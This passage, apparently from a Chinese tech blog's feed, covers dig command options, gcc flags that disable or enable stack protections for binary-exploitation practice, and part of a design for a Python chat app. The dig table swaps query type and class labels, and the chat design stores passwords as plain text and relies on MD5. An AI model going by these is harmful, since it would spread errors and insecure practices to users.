<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig [@global-server] [domain] [q-type] [q-class] &#123;q-opt&#125;</span><br><span class="line">    &#123;global-d-opt&#125; host [@local-server] &#123;local-d-opt&#125;</span><br><span class="line">    [ host [@local-server] &#123;local-d-opt&#125; [...]]</span><br></pre></td></tr></table></figure>

<ol>
<li><p><code>domain</code></p>
<p>域名</p>
</li>
<li><p><code>q-type</code></p>
<p>(in,hs,ch,…) 之一[默认值: in]</p>
</li>
<li><p><code>q-class</code></p>
<p>(a,any,mx,ns,soa,hinfo,axfr,txt,…) 之一[默认值:a]</p>
<p>(Use ixfr=version for type ixfr)</p>
</li>
<li><p><code>q-opt</code></p>
<table>
<thead>
<tr>
<th>keyword</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>-4</td>
<td>仅使用IPv4查询传输</td>
</tr>
<tr>
<td>-6</td>
<td>仅使用IPv6查询传输</td>
</tr>
<tr>
<td>-b address[#port]</td>
<td>绑定到源地址/端口</td>
</tr>
<tr>
<td>-c class</td>
<td>缺省查询类(IN for internet)由选项-c重设。class 可以是任何合法类，比如查询 Hesiod 记录的 HS 类或查询 CHAOSNET 记录的 CH 类。</td>
</tr>
<tr>
<td>-f filename</td>
<td>使dig在批处理模式下运行，通过从文件filename读取一系列搜索请求加以处理。文件包含许多查询；每行一个。文件中的每一项都应该以和使用命令行接口对dig的查询相同的方法来组织。</td>
</tr>
<tr>
<td>-i</td>
<td>使用IP6.INT进行IPv6反向查找</td>
</tr>
<tr>
<td>-k keyfile</td>
<td>签署由dig发送的DNS查询以及对它们使用事务签名(TSIG)的响应时，指定TSIG密钥文件</td>
</tr>
<tr>
<td>-m</td>
<td>启用内存使用调试</td>
</tr>
<tr>
<td>-p port</td>
<td>查询一个非标准的端口号，port是dig将发送其查询的端口号，而不是标准的 DNS 端口号 53。该选项可用于测试已在非标准端口号上配置成侦听查询的域名服务器。</td>
</tr>
<tr>
<td>-q name</td>
<td>指定查询名称</td>
</tr>
<tr>
<td>-t type</td>
<td>设置查询类型为 type。可以是BIND9支持的任意有效查询类型。缺省查询类型是 A，除非提供-x选项来指示一个逆向查询。通过指定 AXFR的type可以请求一个区域传输。当需要增量区域传输（IXFR）时，type 设置为 ixfr=N。增量区域传输将包含自从区域的SOA记录中的序列号改为 N 之后对区域所做的更改。</td>
</tr>
<tr>
<td>-u</td>
<td>以usec代替msec显示时间</td>
</tr>
<tr>
<td>-x dot-notation</td>
<td>反 向查找的快捷方式</td>
</tr>
<tr>
<td>-y[hmac:]name:key</td>
<td>指定 TSIG 密钥；name是TSIG密码的名称，key是实际的密码。密码是64位加密字符串，通常由dnssec-keygen(8)生成。</td>
</tr>
</tbody></table>
</li>
<li><p><code>d-opt</code>全局查询选项</p>
<p>形式是<code>+keyword[=value]</code>，其中<code>keyword</code>如下</p>
<table>
<thead>
<tr>
<th>keyword</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>+[no]aaflag</td>
<td>在查询中[不]设置AA标志</td>
</tr>
<tr>
<td>+[no]aaonly</td>
<td>在查询中[不]只设置AA标志</td>
</tr>
<tr>
<td>+[no]additional</td>
<td>显示 [不显示] 应答的附加部分。缺省显示。</td>
</tr>
<tr>
<td>+[no]adflag</td>
<td>在查询中设置 [不设置] AD（真实数据）位。目前 AD 位只在响应中有标准含义，而查询中没有，但是出于完整性考虑在查询中这种性能可以设置。</td>
</tr>
<tr>
<td>+[no]all</td>
<td>设置或清除所有显示标志。</td>
</tr>
<tr>
<td>+[no]answer</td>
<td>显示 [不显示] 应答的回答部分。缺省显示。</td>
</tr>
<tr>
<td>+[no]authority</td>
<td>显示 [不显示] 应答的权限部分。缺省显示。</td>
</tr>
<tr>
<td>+[no]badcookie</td>
<td>[不]重试badcookie响应</td>
</tr>
<tr>
<td>+[no]besteffort</td>
<td>是否 尝试解析非法消息</td>
</tr>
<tr>
<td>+buffsize=###</td>
<td>设置使用 EDNS0 的 UDP 消息缓冲区大小为###字节。缓冲区的最大值和最小值分别为 65535 和 0。超出这个范围的值自动舍入到最近的有效值。</td>
</tr>
<tr>
<td>+[no]cdflag</td>
<td>在查询中设置 [不设置] CD（检查禁用）位。它请求服务器不运行响应信息的 DNSSEC 合法性。</td>
</tr>
<tr>
<td>+[no]class</td>
<td>控制记录中class是否显示。</td>
</tr>
<tr>
<td>+[no]cmd</td>
<td>设定在输出中显示指出 dig 版本及其所用的查询选项的初始注释。缺省情况下显示注释。</td>
</tr>
<tr>
<td>+[no]comments</td>
<td>切换输出中的注释行显示。缺省值是显示注释。</td>
</tr>
<tr>
<td>+[no]cookie</td>
<td>是否向请求添加cookie选项。</td>
</tr>
<tr>
<td>+[no]crypto</td>
<td>控制记录中加密字段是否显示。</td>
</tr>
<tr>
<td>+[no]defname</td>
<td>是否使用搜索列表。</td>
</tr>
<tr>
<td>+[no]dnssec</td>
<td>是否请求dnssec记录。</td>
</tr>
<tr>
<td>+domain=###</td>
<td>设置默认域名为###。</td>
</tr>
<tr>
<td>+[no]dscp[=###]</td>
<td>是否设置dscp值为###。</td>
</tr>
<tr>
<td>+[no]edns[=###]</td>
<td>是否设置edns版本。</td>
</tr>
<tr>
<td>+ednsflags=###</td>
<td>设置EDNS标志位为###。</td>
</tr>
<tr>
<td>+[no]ednsnegotiation</td>
<td>是否设置EDNS版本协商。</td>
</tr>
<tr>
<td>+ednsopt=###[:value]</td>
<td>发送指定的EDNS选项。</td>
</tr>
<tr>
<td>+noednsopt</td>
<td>清除+ednsopt选项列表。</td>
</tr>
<tr>
<td>+[no]expire</td>
<td>是否请求过期时间。</td>
</tr>
<tr>
<td>+[no]fail</td>
<td>是否在SERVFAIL上尝试下一个服务器。</td>
</tr>
<tr>
<td>+[no]identify</td>
<td>当启用 +short 选项时，显示 [或不显示] 提供应答的 IP 地址和端口号。如果请求简短格式应答，缺省情况不显示提供应答的服务器的源地址和端口号。</td>
</tr>
<tr>
<td>+[no]idnin</td>
<td>是否解析IDN名称。</td>
</tr>
<tr>
<td>+[no]idnout</td>
<td>是否转换IDN响应。</td>
</tr>
<tr>
<td>+[no]ignore</td>
<td>忽略 UDP 响应的中断，而不是用 TCP 重试。缺省情况运行 TCP 重试。</td>
</tr>
<tr>
<td>+[no]keepopen</td>
<td>是否在查询之间保持TCP套接字打开。</td>
</tr>
<tr>
<td>+[no]mapped</td>
<td>是否允许通过IPv6映射IPv4。</td>
</tr>
<tr>
<td>+[no]multiline</td>
<td>以详细的多行格式显示类似 SOA 的记录，并附带可读注释。缺省值是每单个行上显示一条记录，以便于计算机解析 dig 的输出。</td>
</tr>
<tr>
<td>+ndots=###</td>
<td>出于完全考虑，设置必须出现在名称###的点数。缺省值是使用在 /etc/resolv.conf 中的 ndots 语句定义的，或者是  1，如果没有 ndots 语句的话。带更少点数的名称被解释为相对名称，并通过搜索列表中的域或文件 /etc/resolv.conf  中的域伪指令进行搜索。</td>
</tr>
<tr>
<td>+[no]nsid</td>
<td>是否请求名称服务器(NS)ID。</td>
</tr>
<tr>
<td>+[no]nssearch</td>
<td>这个选项被设置时，dig 试图寻找包含待搜名称的网段的权威域名服务器，并显示网段中每台域名服务器的 SOA 记录。</td>
</tr>
<tr>
<td>+[no]onesoa</td>
<td>AXFR是否只打印一个soa记录。</td>
</tr>
<tr>
<td>+[no]opcode=###</td>
<td>设置请求的操作码为###。</td>
</tr>
<tr>
<td>+[no]qr</td>
<td>该查询选项设定显示统计信息：查询进行时，应答的大小等等。缺省显示查询统计信息。</td>
</tr>
<tr>
<td>+[no]question</td>
<td>当返回应答时，显示 [不显示] 查询请求的问题部分。缺省作为注释显示问题部分。</td>
</tr>
<tr>
<td>+[no]rdflag</td>
<td>是否设置递归模式。</td>
</tr>
<tr>
<td>+[no]recurse</td>
<td>切换查询中的 RD（要求递归）位设置。在缺省情况下设置该位，也就是说 dig 正常情形下发送递归查询。当使用查询选项 +nssearch 或 +trace 时，递归自动禁用。</td>
</tr>
<tr>
<td>+retry=###</td>
<td>设置UDP重试次数为###。</td>
</tr>
<tr>
<td>+[no]rrcomments</td>
<td>是否控制每条记录注释的显示。</td>
</tr>
<tr>
<td>+[no]search</td>
<td>使用 [不使用] 搜索列表或 resolv.conf 中的域伪指令（如果有的话）定义的搜索列表。缺省情况不使用搜索列表。</td>
</tr>
<tr>
<td>+[no]short</td>
<td>提供简要答复。缺省值是以冗长格式显示答复信息。</td>
</tr>
<tr>
<td>+[no]showsearch</td>
<td>是否使用中间结果搜索。</td>
</tr>
<tr>
<td>+[no]sigchase</td>
<td>是否使用DNSSEC签名。</td>
</tr>
<tr>
<td>+[no]split=##</td>
<td>是否将十六进制/base64字段拆分为块</td>
</tr>
<tr>
<td>+[no]stats</td>
<td>该查询选项设定显示统计信息：查询进行时，应答的大小等等。缺省显示查询统计信息。</td>
</tr>
<tr>
<td>+subent=addr</td>
<td>设置edns客户端子网选项。</td>
</tr>
<tr>
<td>+[no]tcp</td>
<td>查询域名服务器时使用 [不使用] TCP。缺省行为是使用 UDP，除非是 AXFR 或 IXFR 请求，才使用 TCP 连接。</td>
</tr>
<tr>
<td>+timeout=###</td>
<td>设置查询超时时间为###。</td>
</tr>
<tr>
<td>+[no]topdown</td>
<td>是否设置自上而下的sigchase查询模式</td>
</tr>
<tr>
<td>+[no]trace</td>
<td>切换为待查询名称从根名称服务器开始的代理路径跟踪。缺省情况不使用跟踪。一旦启用跟踪，dig 使用迭代查询解析待查询名称。它将按照从根服务器的参照，显示来自每台使用解析查询的服务器的应答。</td>
</tr>
<tr>
<td>+trusted-key=####</td>
<td>设置与+sigchase一起使用的可信密钥为####。</td>
</tr>
<tr>
<td>+tries=###</td>
<td>设置UDP尝试次数为###。</td>
</tr>
<tr>
<td>+[no]ttlid</td>
<td>是否设置记录中ttls的控制显示。</td>
</tr>
<tr>
<td>+[no]ttlunits</td>
<td>是否设置以可读单位显示TTLs。</td>
</tr>
<tr>
<td>+[no]unknownformat</td>
<td>以RFC 3597“unknown”格式打印RDATA。</td>
</tr>
<tr>
<td>+[no]vc</td>
<td>查询名称服务器时使用 [不使用] TCP。+[no]tcp 的备用语法提供了向下兼容。 vc 代表虚电路。</td>
</tr>
<tr>
<td>+[no]zflag</td>
<td>是否在查询中设置Z标志。</td>
</tr>
</tbody></table>
<p>全局<code>d-opts</code>和服务器（在主机名之前）影响所有查询；</p>
<p>本地<code>d-opts</code>和服务器（在主机名之后）仅影响该查找；</p>
</li>
</ol>
<h1 id="dig常用命令举例"><a href="#dig常用命令举例" class="headerlink" title="dig常用命令举例"></a>dig常用命令举例</h1><ol>
<li><p>查询A/MX/NS记录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig www.baidu.com A/MX/NS +noall +answer</span><br><span class="line"><span class="comment">#查询所有记录</span></span><br><span class="line">dig www.baidu.com ANY +noall +answer</span><br></pre></td></tr></table></figure></li>
<li><p>使用AAAA的选项查询主机的IPv6的AAAA记录，并使用精简答案</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig www.baidu.com AAAA +short</span><br></pre></td></tr></table></figure></li>
<li><p>跟踪dig的查询路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig www.baidu.com +trace</span><br></pre></td></tr></table></figure></li>
<li><p>用dig查看zone数据传输</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig @server www.baidu.com AXFR</span><br></pre></td></tr></table></figure></li>
<li><p>用dig查看zone数据的增量传输</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig @server www.baidu.com AXFR=N</span><br></pre></td></tr></table></figure></li>
<li><p>反向解析</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig -x ip @server</span><br></pre></td></tr></table></figure></li>
<li><p>查看使用的是哪个 <code>F root dns server</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig +norec @F.ROOT-SERVERS.NET HOSTNAME.BIND CHAOS TXT</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://www.cnblogs.com/daxian2012/archive/2013/01/10/2854126.html">Dig HOWTO 中文手册</a></li>
<li><a href="http://www.digwebinterface.com/">dig</a></li>
</ol>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>dig</tag>
      </tags>
  </entry>
  <entry>
    <title>gcc编译中保护机制的关闭和开启</title>
    <url>/gcc%E7%BC%96%E8%AF%91%E4%B8%AD%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%9A%84%E5%85%B3%E9%97%AD%E5%92%8C%E5%BC%80%E5%90%AF.html</url>
    <content><![CDATA[<ul>
<li><p>NX：不允许执行栈上的数据，即无法使用JMP ESP；<span id="more"></span></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-z execstack / -z noexecstack</span><br><span class="line">(关闭/开启)</span><br></pre></td></tr></table></figure></li>
<li><p>Canary：栈里插入cookie信息；</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-fno-stack-protector / -fstack-protector / -fstack-protector-all</span><br><span class="line">(关闭/开启/全开启) </span><br></pre></td></tr></table></figure></li>
<li><p>PIE：地址随机化，另外打开后会有get_pc_thunk；</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-no-pie / -pie</span><br><span class="line">(关闭/开启)</span><br></pre></td></tr></table></figure></li>
<li><p>RELRO：对GOT表具有写权限；</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-z norelro / -z lazy / -z now</span><br><span class="line">(关闭/部分开启/完全开启)</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>二进制学习</category>
      </categories>
      <tags>
        <tag>gcc保护机制</tag>
      </tags>
  </entry>
  <entry>
    <title>UChat-基于python的安全即时通讯系统</title>
    <url>/UChat-%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E5%AE%89%E5%85%A8%E5%8D%B3%E6%97%B6%E9%80%9A%E8%AE%AF%E7%B3%BB%E7%BB%9F.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>设计完成简易的安全即时通讯系统，实现类似于QQ的聊天软件；<span id="more"></span></p>
<h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><h3 id="功能需求"><a href="#功能需求" class="headerlink" title="功能需求"></a>功能需求</h3><ol>
<li><p>聊天客户端</p>
<ol>
<li>注册：用户与集中服务器通信完成注册，包括用户名、密码、邮箱、性别、年龄、数字证书等信息传输，其中数字证书包含公钥、用户名、邮箱等信息。私钥单独保存在客户端一个文件夹下不进行传输；能显示用户名、邮箱不符合格式规范或者重复，空输入等错误信息。</li>
<li>认证登录：客户端与集中服务器通信完成用户名、口令认证登录；能显示用户名、密码错误导致的登录错误信息。还有已登录账号再次登录时的多重登录检验，并将之前登陆的账号顶下去。</li>
<li>好友管理：用户可通过服务器进行搜索、添加、删除好友。</li>
<li>即时通信：用户通过客户端实现与好友的聊天，包括文字、图片传输。文字可实现字体颜色和大小的改变。</li>
<li>聊天记录：客户端能够保存聊天记录并且可以查看聊天记录。</li>
<li>消息加解密：采用D-H体制协商加密秘钥，用对称密码AES算法进行加解密。</li>
<li>消息摘要：使用MD5算法实现消息摘要认证功能，确保发送消息的完整性。</li>
<li>用户未读消息提醒：红点标注未读消息数目，并按最后发送消息时间排列好友列表。</li>
<li>用户离线后消息处理：用户上线后及时接收到离线时好友发送的消息。</li>
</ol>
<p>功能结构图</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714124535.png"></p>
</li>
<li><p>集中服务器</p>
<ol>
<li>用户注册：与用户通信完成注册，对用户名和邮箱格式、是否重复，输入不规范等做必要的检验，接收客户端的数字证书，发送服务端数字证书。</li>
<li>登录验证：用户登录时，验证用户名和密码是否正确，并向客户端返回登录结果。如信息正确，就将在线好友用户发给该用户，将该用户的状态发给各在线好友用户，同时在服务器端显示出来。</li>
<li>用户公钥，证书提供：用户向好友发送消息时，与服务器建立安全连接获取好友的证书信息，服务器控制client.socket像好友用户发送信息，实现用户之间的通信。</li>
<li>用户在线状态维护：当用户在线时，记录保存用户的在线状态、IP地址、端口号。</li>
<li>用户消息列表实时发放：由监听函数将操作实时加入到执行函数列表中递归执行。向用户发送其好友列表的在线离线情况，包括好友用户名、IP地址、端口号。并按照最后发消息的时间对好友消息列表进行排序。</li>
</ol>
<p>功能结构图</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714124653.png"></p>
</li>
<li><p>高级功能</p>
<ol>
<li>离线用户消息通知：暂时存储离线用户的消息，用户上线后，显示未读的消息并用红点标注；</li>
<li>好友在线离线功能实时更新；</li>
<li>限制账号只能一处登录：一个账号只能在一处登录，在别处登录时会把原先的登录踢下线；</li>
<li>支持群聊功能：可以创建群聊，并根据群号加入群聊；</li>
<li>聊天时字体大小颜色可更改；</li>
<li>支持聊天各类图像文件的缓存。</li>
</ol>
</li>
</ol>
<h3 id="数据需求"><a href="#数据需求" class="headerlink" title="数据需求"></a>数据需求</h3><ol>
<li><p>客户端</p>
<p>客户端登录后加过的好友和加入的群聊需要从数据库中调出信息并在前端反馈呈现出来。客户端的聊天记录可以存储在数据库中，用到时直接读取返回消息历史。</p>
</li>
<li><p>集中服务器</p>
<ol>
<li><p>users表：用户信息表，存储用户基本信息，包括用户ID(id)、用户名(username)、密码(password)、电子邮箱(email)、用户登录IP地址(ip)、用户登录端口(port)、性别(sex)、年龄(age)、公钥(pk)。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>数据类型</th>
<th>主键</th>
<th>是否唯一</th>
<th>是否为空</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>INTEGER</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
<td>用户id</td>
</tr>
<tr>
<td>username</td>
<td>TEXT</td>
<td>N</td>
<td>Y</td>
<td>N</td>
<td>用户名</td>
</tr>
<tr>
<td>password</td>
<td>TEXT</td>
<td>N</td>
<td>Y</td>
<td>N</td>
<td>密码</td>
</tr>
<tr>
<td>email</td>
<td>TEXT</td>
<td>N</td>
<td>Y</td>
<td>N</td>
<td>邮箱</td>
</tr>
<tr>
<td>ip</td>
<td>TEXT</td>
<td>N</td>
<td>Y</td>
<td>N</td>
<td>登录IP</td>
</tr>
<tr>
<td>port</td>
<td>TEXT</td>
<td>N</td>
<td>Y</td>
<td>N</td>
<td>登录端口</td>
</tr>
<tr>
<td>sex</td>
<td>TEXT</td>
<td>N</td>
<td>Y</td>
<td>N</td>
<td>性别</td>
</tr>
<tr>
<td>age</td>
<td>TEXT</td>
<td>N</td>
<td>Y</td>
<td>N</td>
<td>姓名</td>
</tr>
<tr>
<td>pk</td>
<td>TEXT</td>
<td>N</td>
<td>Y</td>
<td>N</td>
<td>公钥</td>
</tr>
</tbody></table>
</li>
<li><p>friends表：存储用户的好友信息，包括用户id(from_user_id)、好友id(to_user_id)、加好友请求是否接受(accepted)。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>数据类型</th>
<th>主键</th>
<th>是否唯一</th>
<th>是否为空</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>from_user_id</td>
<td>INTEGER</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
<td>本人ID</td>
</tr>
<tr>
<td>to_user_id</td>
<td>INTEGER</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
<td>好友ID</td>
</tr>
<tr>
<td>accept</td>
<td>BOOLEAN</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>接受状态</td>
</tr>
</tbody></table>
</li>
<li><p>chat_history表：存储好友的聊天记录，包括发送方ID(user_id)、接收方(target_id)ID(target_type)、聊天数据(data)(BLOB类型存储二进制大对象，可以实现文件数据的直接存储)，sent(用于标识消息是否已发送，若未发送，先存储这个操作，在某一次事件再次触发时检查标志位，操作服务端再次控制client.socket发送消息)。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>数据类型</th>
<th>主键</th>
<th>是否唯一</th>
<th>是否为空</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>INTEGER</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
<td>消息ID</td>
</tr>
<tr>
<td>user_id</td>
<td>INTEGER</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>用户ID</td>
</tr>
<tr>
<td>target_id</td>
<td>INTEGER</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>消息目标ID</td>
</tr>
<tr>
<td>target_type</td>
<td>TEXT</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>目标类型：群/用户</td>
</tr>
<tr>
<td>data</td>
<td>BLOB</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>消息体</td>
</tr>
<tr>
<td>sent</td>
<td>BOOLEAN</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>发送是否成功</td>
</tr>
</tbody></table>
</li>
<li><p>rooms表：群组表，包括该群组的主键ID(id)、群组的名称(room_name)。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>数据类型</th>
<th>主键</th>
<th>是否唯一</th>
<th>是否为空</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>INTEGER</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
<td>群聊ID</td>
</tr>
<tr>
<td>room_name</td>
<td>TEXT</td>
<td>N</td>
<td>Y</td>
<td>N</td>
<td>群聊名</td>
</tr>
</tbody></table>
</li>
<li><p>room_user表：群组用户表，包括群组的ID，群聊房间号(room_id)、加入该群组的用户(user_id)。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>数据类型</th>
<th>主键</th>
<th>是否唯一</th>
<th>是否为空</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>INTEGER</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
<td>ID</td>
</tr>
<tr>
<td>room_id</td>
<td>INTEGER</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>群聊ID</td>
</tr>
<tr>
<td>user_id</td>
<td>INTEGER</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>用户ID</td>
</tr>
</tbody></table>
</li>
</ol>
</li>
</ol>
<h3 id="性能需求"><a href="#性能需求" class="headerlink" title="性能需求"></a>性能需求</h3><ol>
<li><p>可靠性需求</p>
<p>保证一个用户只能同时使用一个IP地址登录，客户端不会出现闪退、加密无效的情况。</p>
</li>
<li><p>安全性需求</p>
<p>客户端做好完整的封装；传输信息采用经过公钥加密机制协商的AES对称加密秘钥；服务器及时更新客户端IP地址等信息。</p>
</li>
<li><p>可维护性与可扩展性需求</p>
<p>对于软件功能方面，采用高内聚低耦合的模块化设计，包括登录模块、注册模块、好友列表模块、聊天模块等，确保每个模块的具有较高的独立性，使软件源码便于维护，同时便于后期添加聊天群等更多扩展内容，保证软件可以进行更新换代。</p>
</li>
<li><p>运行环境需求</p>
<ol>
<li><p>客户端：python3</p>
</li>
<li><p>服务端：</p>
<p>python3</p>
<p>PC硬盘容量：50G<br>运行内存：2G</p>
</li>
</ol>
</li>
</ol>
<h3 id="UI需求"><a href="#UI需求" class="headerlink" title="UI需求"></a>UI需求</h3><ol>
<li>页面内容：聊天字体大小和颜色可更改，主题突出，语言简单明了易懂，菜单设置合理、页面布局规范，文字准确，语言流畅。</li>
<li>技术环境：页面大小合适，无错误链接和空链接。</li>
<li>艺术风格：界面版面形象清晰，布局合理，字号大小适宜，字体选择合理，前后一致，动静搭配恰当，色彩和谐自然，与主题内容协调。</li>
</ol>
<h3 id="操作需求"><a href="#操作需求" class="headerlink" title="操作需求"></a>操作需求</h3><ol>
<li>所有弹出的窗口不超过一层，无层层堆叠的现象，不能无故为操作增加复杂度。</li>
<li>用户注册、用户登录、添加好友、删除好友聊天窗口的开启等所有操作务必要简单、快捷，限制在两次点击以内。</li>
<li>考虑到操作人员工作的实际环境状况，就要保证设计的按键足够的清晰足够大。</li>
</ol>
<h2 id="详细设计"><a href="#详细设计" class="headerlink" title="详细设计"></a>详细设计</h2><h3 id="系统结构说明"><a href="#系统结构说明" class="headerlink" title="系统结构说明"></a>系统结构说明</h3><p>本系统的核心控制逻辑在于C-S-C之间发送的数据中包含了操作码，接收方通过对接收码的识别作出规定的操作。例如服务端接收添加好友的操作码会执行add_friend.py。客户端接收操作码并不断把对应函数放入递归函数的队列中，由递归函数逐一执行队列中的函数。</p>
<p>系统主要分为三个部分：</p>
<ul>
<li>聊天客户端(client)</li>
<li>集中服务器(server)</li>
<li>相互通信时的共同部分(common)</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Uchat</span><br><span class="line">│	config.json</span><br><span class="line">│	run_client.py</span><br><span class="line">│	run_server.py</span><br><span class="line">│</span><br><span class="line">├─client</span><br><span class="line">││		__init__.py</span><br><span class="line">││</span><br><span class="line">│├─components</span><br><span class="line">││		contact_item.py<span class="comment">//联系人列表UI</span></span><br><span class="line">││		vertical_scrolled_frame.py<span class="comment">//Tkinter可滚动框架</span></span><br><span class="line">││		__init__.py</span><br><span class="line">││</span><br><span class="line">│├─forms</span><br><span class="line">│││		chat_form.py<span class="comment">//聊天界面及处理与聊天相关的事件</span></span><br><span class="line">│││		contacts_form.py<span class="comment">//联系人列表</span></span><br><span class="line">│││		login_form.py<span class="comment">//登录界面</span></span><br><span class="line">│││		register_form.py<span class="comment">//注册界面</span></span><br><span class="line">│││		__init__.py</span><br><span class="line">│││</span><br><span class="line">││└───images<span class="comment">//背景图片</span></span><br><span class="line">││		contacts_bg.gif</span><br><span class="line">││		contacts_bg.png</span><br><span class="line">││		login_bg.gif</span><br><span class="line">││		register_bg.gif</span><br><span class="line">││		VerticalScrolled.png</span><br><span class="line">││</span><br><span class="line">│├─memory</span><br><span class="line">││		__init__.py<span class="comment">//缓存数据</span></span><br><span class="line">││</span><br><span class="line">│└─util</span><br><span class="line">│	│	__init__.py</span><br><span class="line">│	└─	socket_listener</span><br><span class="line">│			__init__.py<span class="comment">//监听socket的线程</span></span><br><span class="line">│</span><br><span class="line">├─common</span><br><span class="line">││		config.py<span class="comment">//获取配置信息</span></span><br><span class="line">││		global_vars.py<span class="comment">//全局变量</span></span><br><span class="line">││		__init__.py</span><br><span class="line">││</span><br><span class="line">│├─cryptography</span><br><span class="line">││		crypt.py<span class="comment">//密钥协商相关函数</span></span><br><span class="line">││		prime.py<span class="comment">//随机生成一个大素数</span></span><br><span class="line">││		__init__.py</span><br><span class="line">││</span><br><span class="line">│├─message</span><br><span class="line">││		__init__.py<span class="comment">//消息处理(消息类型定义，序列化过程等)</span></span><br><span class="line">││</span><br><span class="line">│├─transmission</span><br><span class="line">││		secure_channel.py<span class="comment">//安全信道的建立和传输</span></span><br><span class="line">││		__init__.py</span><br><span class="line">││</span><br><span class="line">│└─util</span><br><span class="line">│	│	__init__.py</span><br><span class="line">│	│</span><br><span class="line">│	└─	socket_listener</span><br><span class="line">│			__init__.py<span class="comment">//客户端socket监听</span></span><br><span class="line">│</span><br><span class="line">└─server</span><br><span class="line">	│	database.db</span><br><span class="line">	│	main.sql</span><br><span class="line">	│	__init__.py</span><br><span class="line">	│</span><br><span class="line">	├─broadcast</span><br><span class="line">	│	__init__.py<span class="comment">//广播消息</span></span><br><span class="line">	│</span><br><span class="line">	├─event_handler</span><br><span class="line">	│	add_friend.py<span class="comment">//加好友</span></span><br><span class="line">	│	bad.py<span class="comment">//出现错误操作使程序走向可处理除0操作</span></span><br><span class="line">	│	client_echo.py<span class="comment">//测试CS通信</span></span><br><span class="line">	│	create_room.py<span class="comment">//创建群聊</span></span><br><span class="line">	│	del_friend.py<span class="comment">//删除好友</span></span><br><span class="line">	│	join_room.py<span class="comment">//加入群聊</span></span><br><span class="line">	│	login.py<span class="comment">//登录</span></span><br><span class="line">	│	query_room_users.py<span class="comment">//执行群聊中发消息的操作</span></span><br><span class="line">	│	<span class="keyword">register</span>.py<span class="comment">//注册</span></span><br><span class="line">	│	resolve_friend_request.py<span class="comment">//处理加好友请求</span></span><br><span class="line">	│	send_message.py<span class="comment">//发消息</span></span><br><span class="line">	│	__init__.py</span><br><span class="line">	│</span><br><span class="line">	├─memory</span><br><span class="line">	│	__init__.py<span class="comment">//缓存数据</span></span><br><span class="line">	│</span><br><span class="line">	└─util</span><br><span class="line">		│__init__.py<span class="comment">//添加对象类型</span></span><br><span class="line">		│</span><br><span class="line">		└─database</span><br><span class="line">			__init__.py<span class="comment">//数据库操作</span></span><br></pre></td></tr></table></figure>

<ol>
<li><p>聊天客户端client</p>
<p>实现安全即时通信系统的客户端，主要功能是通过界面与用户实现交互；通过socket与集中服务器进行通信，获得集中服务器的服务，实现用户的注册登录等功能。与好友即时通信和加入群聊通信。</p>
<ol>
<li>登录模块LoginForm<br>该模块创建登录界面并可链接到注册界面，若输入为空则报错，否则将获取用户输入的用户名和密码打包成登录请求消息(MessageType.login)发送给服务器，服务器根据消息类型和数据包中的内容以及在数据库查找到的结果进行判断，根据不同情况发送不同的反馈给客户端。客户端收到反馈消息，若data[‘type’]为login_failed，则用户名和密码输入有误；若为data[‘type’]为login_successful则根据memory进入登录后显示好友列表的ContractsForm界面。</li>
